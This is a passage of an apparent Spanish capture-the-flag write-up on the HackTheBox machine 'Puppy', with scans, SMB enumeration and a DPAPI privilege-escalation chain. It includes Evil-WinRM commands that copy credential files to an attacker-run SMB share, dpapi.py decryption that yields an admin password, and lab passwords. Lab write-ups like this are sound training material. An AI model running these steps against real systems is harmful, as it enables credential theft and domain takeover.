556a2412-1275-4ccf-b721-e6a0b4f90407 -a-hs- 2/23/2025 2:36 PM 24 Preferred Con lo cual vamos a proceder a descargarlo con smb server.\n❯ sudo smbserver.py smbFolder $(pwd) -smb2support [sudo] contraseña para borhub: /usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u003c81. import pkg_resources Impacket v0.11.0 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.11.70,49903) [*] AUTHENTICATE_MESSAGE (\\,DC) [*] User DC\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa [*] Connecting Share(1:IPC$) [*] Connecting Share(2:smbFolder) [*] Disconnecting Share(1:IPC$) [*] Disconnecting Share(2:smbFolder) [*] Closing down connection (10.10.11.70,49903) [*] Remaining connections [] Y repetimos el proceso pero con los archivos con las credenciales.\nLocal Credential Data *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\u003e Get-ChildItem -Force -Hidden \"C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\" Directory: C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials ​Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 3/8/2025 8:14 AM 11068 DFBE70A7E5CC19A398EBF1B96859CE5D *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\u003e copy C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D \\\\10.10.15.254\\smbFolder\\ Enterprise Credential Data *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\u003e Get-ChildItem -Force \"C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials\\\" Directory: C:\\Users\\steph.cooper\\AppData\\Local\\Microsoft\\Credentials​ Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 3/8/2025 8:14 AM 11068 DFBE70A7E5CC19A398EBF1B96859CE5D *Evil-WinRM* PS C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\u003e copy C:\\Users\\steph.cooper\\AppData\\Roaming\\Microsoft\\Credentials\\C8D69EBE9A43E9DEBF6B5FBD48B521B9 \\\\10.10.15.254\\smbFolder\\ Obtener credenciales archivos - Impacket-Dpapi.py Primero necesitamos obtener la clave maestra descifrada y para ello vamos a usar dpapi.py.\n❯ dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107 Impacket v0.11.0 - Copyright 2023 Fortra [MASTERKEYFILE] Version : 2 (2) Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407 Flags : 0 (0) Policy : 4ccf1275 (1288639093) MasterKeyLen: 00000088 (136) BackupKeyLen: 00000068 (104) CredHistLen : 00000000 (0) DomainKeyLen: 00000174 (372) Decrypted key with User Key (MD4 protected) Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 Una vez hemos obtenido la clave vamos a descifrar el archivo de credenciales.\n❯ dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 /usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u003c81. import pkg_resources Impacket v0.11.0 - Copyright 2023 Fortra [CREDENTIAL] LastWritten : 2025-03-08 15:54:29 Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH) Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE) Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD) Target : Domain:target=PUPPY.HTB Description : Unknown : Username : steph.cooper_adm Unknown : FivethChipOnItsWay2025! Root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e type root.txt a156d9df5a1856a37db713bac39f4d21 ",
+  "wordCount" : "3193",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/logo_machines/puppy.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/puppy/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Puppy
+    </h1>
+    <div class="post-description">
+      Writeup sobre la máquina Puppy en Active Directory de dificultad Media. Durante el acceso inicial abusaremos de privilegios GenericWrite y GenericALL además de descubrir un archivo de credenciales, luego procederemos a movernos al usuario steph.cooper gracias a un leak de información y acabaremos escalando privilegios gracias al descubrimiento de archivos DPAPI.
+    </div>
+    <div class="post-meta"><span>15 min</span>&nbsp;·&nbsp;<span>3193 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-smb" aria-label="Enumeración SMB">Enumeración SMB</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-con-bloodhound" aria-label="Enumeración con bloodhound">Enumeración con bloodhound</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-privilegios-genericwrite---bloodyad-o-net-rpc" aria-label="Abusando de privilegios GenericWrite - BloodyAD o Net Rpc">Abusando de privilegios GenericWrite - BloodyAD o Net Rpc</a></li>
+                <li>
+                    <a href="#ataque-por-fuerza-bruta-al-archivo-kdbx---keepass4brute" aria-label="Ataque por fuerza bruta al archivo .kdbx - Keepass4brute">Ataque por fuerza bruta al archivo .kdbx - Keepass4brute</a></li>
+                <li>
+                    <a href="#comprobaci%c3%b3n-de-credenciales-con-nxc" aria-label="Comprobación de credenciales con nxc">Comprobación de credenciales con nxc</a></li>
+                <li>
+                    <a href="#kerberoast-attack-failed" aria-label="Kerberoast attack [FAILED]">Kerberoast attack [FAILED]</a></li>
+                <li>
+                    <a href="#shadow-credential-attack-failed" aria-label="Shadow Credential Attack [FAILED]">Shadow Credential Attack [FAILED]</a></li>
+                <li>
+                    <a href="#force-change-password---net-rpc" aria-label="Force Change Password - Net rpc">Force Change Password - Net rpc</a></li>
+                <li>
+                    <a href="#deshabilitar-accountdisable---bloodyad" aria-label="Deshabilitar ACCOUNTDISABLE - BloodyAD">Deshabilitar ACCOUNTDISABLE - BloodyAD</a></li></ul>
+                </li>
+                <li>
+                    <a href="#movimiento-lateral" aria-label="Movimiento lateral">Movimiento lateral</a><ul>
+                        
+                <li>
+                    <a href="#descarga-de-archivos-con-smb-server" aria-label="Descarga de archivos con smb server">Descarga de archivos con smb server</a></li>
+                <li>
+                    <a href="#leak-information" aria-label="Leak Information">Leak Information</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#winpeasx64exe" aria-label="winPEASx64.exe">winPEASx64.exe</a></li>
+                <li>
+                    <a href="#dpapi-data-protection-api" aria-label="DPAPI (Data Protection API)">DPAPI (Data Protection API)</a><ul>
+                        
+                <li>
+                    <a href="#dpapi-master-keys" aria-label="DPAPI Master Keys">DPAPI Master Keys</a></li>
+                <li>
+                    <a href="#dpapi-credentials-file" aria-label="DPAPI Credentials File">DPAPI Credentials File</a><ul>
+                        
+                <li>
+                    <a href="#descargar-archivos-con-smb-server" aria-label="Descargar archivos con smb server">Descargar archivos con smb server</a></li></ul>
+                </li>
+                <li>
+                    <a href="#local-credential-data" aria-label="Local Credential Data">Local Credential Data</a></li>
+                <li>
+                    <a href="#enterprise-credential-data" aria-label="Enterprise Credential Data">Enterprise Credential Data</a></li>
+                <li>
+                    <a href="#obtener-credenciales-archivos---impacket-dpapipy" aria-label="Obtener credenciales archivos - Impacket-Dpapi.py">Obtener credenciales archivos - Impacket-Dpapi.py</a></li>
+                <li>
+                    <a href="#roottxt" aria-label="Root.txt">Root.txt</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Máquina Medium - Windows | Credenciales levi.james / KingofAkron2025!</p>
+<p><img alt="Puppy Machine" loading="lazy" src="/img/puppy/puppy_machine.png"></p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.70 -oG ports
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> may be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-02 09:32 CEST
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 09:32
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.70 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 111/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 3268/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 9389/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 593/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 636/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 2049/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 49664/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 63992/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 3260/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 49667/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 64010/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 3269/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 49670/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 49669/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Discovered open port 464/tcp on 10.10.11.70
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 09:32, 26.40s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.70
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.052s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-06-02 09:32:02 CEST <span class="k">for</span> 26s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65513</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">53/tcp open domain syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">88/tcp open kerberos-sec syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">111/tcp open rpcbind syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">135/tcp open msrpc syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">139/tcp open netbios-ssn syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">389/tcp open ldap syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">445/tcp open microsoft-ds syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">464/tcp open kpasswd5 syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">593/tcp open http-rpc-epmap syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">636/tcp open ldapssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">2049/tcp open nfs syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3260/tcp open iscsi syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3268/tcp open globalcatLDAP syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">3269/tcp open globalcatLDAPssl syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">5985/tcp open wsman syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">9389/tcp open adws syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49664/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49667/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49669/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">49670/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">63992/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">64010/tcp open unknown syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.45 seconds
+</span></span><span class="line"><span class="cl">	Raw packets sent: <span class="m">131060</span> <span class="o">(</span>5.767MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">34</span> <span class="o">(</span>1.496KB<span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49669,49670,63992,64010 10.10.11.70 -oN targeted
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-02 09:35 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> puppy.htb <span class="o">(</span>10.10.11.70<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.097s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Bug in iscsi-info: no string output.
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">53/tcp open domain Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp open kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server time: 2025-06-02 14:35:30Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">111/tcp open rpcbind 2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rpcinfo:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> program version port/proto service
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100000</span> 2,3,4 111/tcp rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100000</span> 2,3,4 111/tcp6 rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100000</span> 2,3,4 111/udp rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100000</span> 2,3,4 111/udp6 rpcbind
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100003</span> 2,3 2049/udp nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100003</span> 2,3 2049/udp6 nfs
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100005</span> 1,2,3 2049/udp mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100005</span> 1,2,3 2049/udp6 mountd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100021</span> 1,2,3,4 2049/tcp nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100021</span> 1,2,3,4 2049/tcp6 nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100021</span> 1,2,3,4 2049/udp nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100021</span> 1,2,3,4 2049/udp6 nlockmgr
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100024</span> <span class="m">1</span> 2049/tcp status
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100024</span> <span class="m">1</span> 2049/tcp6 status
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">100024</span> <span class="m">1</span> 2049/udp status
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ <span class="m">100024</span> <span class="m">1</span> 2049/udp6 status
+</span></span><span class="line"><span class="cl">135/tcp open msrpc Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp open ldap Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: PUPPY.HTB0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp open microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp open kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp open tcpwrapped
+</span></span><span class="line"><span class="cl">2049/tcp open nlockmgr 1-4 <span class="o">(</span>RPC <span class="c1">#100021)</span>
+</span></span><span class="line"><span class="cl">3260/tcp open iscsi?
+</span></span><span class="line"><span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: PUPPY.HTB0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp open tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp open http Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp open mc-nmf .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open msrpc Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open msrpc Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open msrpc Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">63992/tcp open msrpc Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">64010/tcp open msrpc Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 6h59m58s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 3:1:1:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ Message signing enabled and required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> date: 2025-06-02T14:37:20
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ start_date: N/A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 208.23 seconds
+</span></span></code></pre></div><h1 id="enumeración-smb">Enumeración SMB<a hidden class="anchor" aria-hidden="true" href="#enumeración-smb">#</a></h1>
+<p>Comprobamos que las credenciales que tenemos sean válidas para smb:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.70 -u <span class="s1">&#39;levi.james&#39;</span> -p <span class="s1">&#39;KingofAkron2025!&#39;</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:PUPPY.HTB<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> PUPPY.HTB<span class="se">\l</span>evi.james:KingofAkron2025!
+</span></span></code></pre></div><p>Listado de carpetas compartidas, parece que de momento no tenemos permiso de lectura con la carpeta DEV aunque luego lo comprobaremos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.70 -u <span class="s1">&#39;levi.james&#39;</span> -p <span class="s1">&#39;KingofAkron2025!&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:PUPPY.HTB<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> PUPPY.HTB<span class="se">\l</span>evi.james:KingofAkron2025!
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC Share Permissions Remark
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC ----- ----------- ------
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC ADMIN$ Remote Admin
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC C$ Default share
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC DEV DEV-SHARE <span class="k">for</span> PUPPY-DEVS
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC IPC$ READ Remote IPC
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC NETLOGON READ Logon server share
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC SYSVOL READ Logon server share
+</span></span></code></pre></div><p>Listado de usuarios:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.70 -u <span class="s1">&#39;levi.james&#39;</span> -p <span class="s1">&#39;KingofAkron2025!&#39;</span> --users
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:PUPPY.HTB<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> PUPPY.HTB<span class="se">\l</span>evi.james:KingofAkron2025!
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC -Username- -Last PW Set- -BadPW- -Description-
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC Administrator 2025-02-19 19:33:28 <span class="m">0</span> Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC Guest &lt;never&gt; <span class="m">0</span> Built-in account <span class="k">for</span> guest access to the computer/domain
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC krbtgt 2025-02-19 11:46:15 <span class="m">0</span> Key Distribution Center Service Account
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC levi.james 2025-02-19 12:10:56 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC ant.edwards 2025-02-19 12:13:14 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC adam.silver 2025-06-02 14:34:28 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC jamie.williams 2025-02-19 12:17:26 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC steph.cooper 2025-02-19 12:21:00 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC steph.cooper_adm 2025-03-08 15:50:40 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.70 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Enumerated <span class="m">9</span> <span class="nb">local</span> users: PUPPY
